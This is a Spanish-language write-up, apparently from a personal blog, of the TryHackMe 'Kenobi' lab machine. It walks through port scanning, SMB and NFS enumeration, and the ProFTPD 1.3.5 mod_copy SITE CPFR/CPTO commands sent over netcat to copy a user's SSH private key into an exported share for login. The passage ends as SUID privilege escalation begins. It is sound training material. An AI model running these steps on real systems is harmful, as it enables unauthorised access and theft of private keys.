&lt;p&gt;Primeramente, vamos a utilizar la herramienta &lt;em&gt;Nmap&lt;/em&gt; para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo.&lt;/p&gt;

&lt;p&gt;Para determinar que puertos están abiertos podemos realizar lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de puertos con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todo el rango de puertos (65535 en total)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;--open&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-T5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-v&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;em&gt;Verbose&lt;/em&gt;, reporta lo encontrado por consola&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-n&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;resolución DNS&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo &lt;em&gt;TCP SYN&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-min-rate&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Emitir paquetes no más lentos que &amp;lt;valor&amp;gt; por segundo&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-vvv&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Triple &lt;em&gt;verbose&lt;/em&gt;, para obtener mayor información por consola&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;host discovery&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 21,22,80,111,139,445,2049,35049,41843,47869,50933 &amp;lt;dirección IP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sC&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Scripts básicos de enumeración&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Versión y servicios que corren bajo los puertos encontrados&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Con estos dos escaneos bastaría para responder a dos de las preguntas planteadas:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;¿Cuántos puertos abiertos existen?&lt;/li&gt;
  &lt;li&gt;¿En qué puerto está corriendo el protocolo FTP?&lt;/li&gt;
  &lt;li&gt;¿Cuál es la versión del servicio ProFTPD que se está corriendo?&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para responder a estas dos últimas preguntas solo tenemos que revisar el escaneo de versiones y servicios que realizamos con &lt;em&gt;Nmap&lt;/em&gt;; por otra parte, la primera pregunta tiene algo de trampa, ya que la respuesta correcta es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7&lt;/code&gt; puertos abiertos, mientras que con nuestro escaneo detectamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;11&lt;/code&gt;, ¿qué hicimos mal?&lt;/p&gt;

&lt;p&gt;Nada, lo que sucede es que nosotros al indicar el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p-&lt;/code&gt;, estamos escaneando todo el rango de puertos, si no indicáramos este parámetro, &lt;em&gt;Nmap&lt;/em&gt; escanearía únicamente los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1000&lt;/code&gt; puertos más comunes, por lo que vemos que &lt;em&gt;TryHackMe&lt;/em&gt; no se dio la molestia de escanearlo todo por completo.&lt;/p&gt;

&lt;p&gt;Habiendo aclarado esto, los puertos abiertos más relevantes que encontramos son el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;139&lt;/code&gt; y el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;445&lt;/code&gt;, ambos relacionados con el protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; (Server Message Block), el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;111&lt;/code&gt; relacionado con el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcbind&lt;/code&gt;, relacionado a su vez con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RPC&lt;/code&gt; (Remote Procedure Call), y el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;21&lt;/code&gt; relacionado con el protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; (File Transfer Protocol).&lt;/p&gt;

&lt;p&gt;En este punto, &lt;em&gt;TryHackMe&lt;/em&gt; nos sugiere usar el propio &lt;em&gt;Nmap&lt;/em&gt; para enumerar los recursos compartidos a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Samba&lt;/code&gt;, que si bien podemos hacerlo, optaremos por usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMBMap&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;smbmap&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;SMBMap&lt;/h3&gt;

&lt;p&gt;Para poder listar los recursos compartidos haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMBMap&lt;/code&gt;, bastará con indicar la direción IP de la máquina víctima.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo primero que podemos darnos cuenta es que existen &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3&lt;/code&gt; recursos compartidos, de los cuales solo tenemos acceso a uno, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Si decidimos listar de manera recursiva el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt;, encontraremos un archivo que lleva por nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log.txt&lt;/code&gt;, el cual ya levanta nuestras sospechas.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &amp;lt;dirección IP&amp;gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; anonymous
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/3.png&quot; alt=&quot;3&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para poder descargar el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log.txt&lt;/code&gt;, podremos hacerlo usando tanto su ruta absoluta con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--download&lt;/code&gt;, o bien creando patrones mediante &lt;em&gt;expresiones regulares&lt;/em&gt; con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-A&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &amp;lt;dirección IP&amp;gt; &lt;span class=&quot;nt&quot;&gt;--download&lt;/span&gt; anonymous/log.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &amp;lt;dirección IP&amp;gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; anonymous &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; log.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/4.png&quot; alt=&quot;4&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;smbclient&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;smbclient&lt;/h3&gt;

&lt;p&gt;Para poder listar los recursos compartidos haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; tendremos que especificar el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-L&lt;/code&gt;, adicional a ello tendremos que indicar que queremos hacer uso de un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null session&lt;/code&gt; con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-N&lt;/code&gt;, ya que no conocemos credenciales con las cuales autenticarnos; esto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMBMap&lt;/code&gt; no ocurría ya que por defecto hace uso de un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null session&lt;/code&gt;, a no ser que le indiquemos un usuario y contraseña.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/5.png&quot; alt=&quot;5&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En este caso, no se nos indica los permisos que tenemos sobre los recursos, no obstante, podemos intuir a que recursos tenemos acceso, por ejemplo, el recurso &lt;a href=&quot;https://wiki.samba.org/index.php/Setting_up_Automatic_Printer_Driver_Downloads_for_Windows_Clients#Setting_up_the_.5Bprint.24.5D_Share&quot;&gt;print$&lt;/a&gt; se relaciona con impresoras que se están compartiendo a nivel de red, por otra parte, tenemos el recurso &lt;a href=&quot;https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session&quot;&gt;IPC$&lt;/a&gt; el cual crea el propio &lt;em&gt;Windows&lt;/em&gt; para poder hacer uso de los &lt;em&gt;null sessions&lt;/em&gt;; de modo que, de los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3&lt;/code&gt; recursos compartidos existentes, solo nos queda &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Lo siguiente que haremos será listar el contenido que se encuentra dentro del recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; //dirección IP/anonymous
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/6.png&quot; alt=&quot;6&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos observar que dentro existe un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log.txt&lt;/code&gt;, el cual procederemos a descargar.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; //dirección IP/anonymous
get log.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/7.png&quot; alt=&quot;7&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Independientemente de como hayamos descargado el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log.txt&lt;/code&gt;, al leerlo, lo más importante que encontraremos será la ubicación del par de claves &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSA&lt;/code&gt;, ubicadas en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/kenobi/.ssh&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Adicionalmente, encontraremos información tanto del servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProFTPD&lt;/code&gt;, como del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Samba&lt;/code&gt;, pero nada realmente interesante, por lo que estamos omitiendo algo.&lt;/p&gt;

&lt;p&gt;Si recordamos, el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;111&lt;/code&gt;, relacionado con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcbind&lt;/code&gt;, estaba abierto, y lo que nos mostraba nuestro escaneo de versiones y servicios con &lt;em&gt;Nmap&lt;/em&gt;, es que en este puerto está corriendo a su vez el protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NFS&lt;/code&gt; (Network File System) en el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2049&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;El protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NFS&lt;/code&gt; se utiliza principalmente para acceder a archivos compartidos a nivel de red, de manera local. Comprobemos si se está compartiendo algún recurso que podamos &lt;em&gt;montar&lt;/em&gt; en nuestro equipo.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;showmount &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/8.png&quot; alt=&quot;8&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var&lt;/code&gt; está siendo compartida a nivel de red, de modo que si lográramos mover algún archivo potencial dentro de esta ruta, y luego la montásemos en nuestro equipo, podríamos visualizar dicho archivo de manera local.&lt;/p&gt;

&lt;h3 id=&quot;fase-de-explotación&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación&lt;/h3&gt;

&lt;p&gt;Lo primero que podemos pensar es buscar alguna vulnerabilidad en el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProFTPD&lt;/code&gt;, basado en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; (File Transfer Protocol), moviendo así archivos desde el lado del cliente, hacia el servidor.&lt;/p&gt;

&lt;p&gt;Para explotar el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProFTPD&lt;/code&gt;, empezaremos buscando algún exploit que se encuentre en &lt;em&gt;Exploit Database&lt;/em&gt;, para ello utilizaremos &lt;em&gt;SearchSploit&lt;/em&gt; para poder seguir trabajando desde nuestra terminal.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit ProFTPD 1.3.5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/9.png&quot; alt=&quot;9&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4&lt;/code&gt; exploits que encontramos, nos quedaremos con el último&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/10.png&quot; alt=&quot;10&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Concretamente con las líneas 12, 13 y 14.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/11.png&quot; alt=&quot;11&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Las cuales nos permiten hacer justamente lo que nos interesa, copiar un archivo de una ruta (&lt;em&gt;CPFR&lt;/em&gt;), a otra (&lt;em&gt;CPTO&lt;/em&gt;).&lt;/p&gt;

&lt;p&gt;De este modo, si nos conectamos a la máquina víctima a través del puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;21&lt;/code&gt;, podremos ejecutar estos comandos.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &amp;lt;direción IP&amp;gt; 21
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/12.png&quot; alt=&quot;12&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya con todo esto, podemos &lt;em&gt;montar&lt;/em&gt; la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var&lt;/code&gt; en nuestro equipo, para ello haremos lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;mount &amp;lt;dirección IP&amp;gt;:/var /mnt/kenobiNFS
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En caso de que tengamos un error similar a este:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/13.png&quot; alt=&quot;13&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Simplemente tendremos que instalar lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;nfs-common
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y ya que estamos, podemos también instalar la utilidad para montar archivo de tipo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CIFS&lt;/code&gt;, que puede resultarnos de utilidad en algún momento.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;cifs-utils
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez tenemos montada la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var&lt;/code&gt; en nuestro equipo, procederemos a copiarnos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; que movimos con anterioridad haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProFTPD&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Finalmente, podemos conectarnos a la máquina víctima a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt; sin proporcionar contraseña, ya que tenemos en nuestro poder la &lt;em&gt;clave privada&lt;/em&gt; del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kenobi&lt;/code&gt;, no obstante, antes de hacerlo, vamos a asignar los permisos correspondientes al archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo chmod &lt;/span&gt;600 id_rsa
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa kenobi@&amp;lt;dirección IP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/14.png&quot; alt=&quot;14&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;escalada-de-privilegios&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Escalada De Privilegios&lt;/h3&gt;

&lt;p&gt;Para realizar esta última fase, la misma plataforma de &lt;em&gt;TryHackMe&lt;/em&gt; nos sugiere aprovecharnos de algún binario con permisos mal asignados, concretamente permisos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SUID&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para listar todos aquellos binarios con permisos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SUID&lt;/code&gt; asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo:&lt;/p&gt;

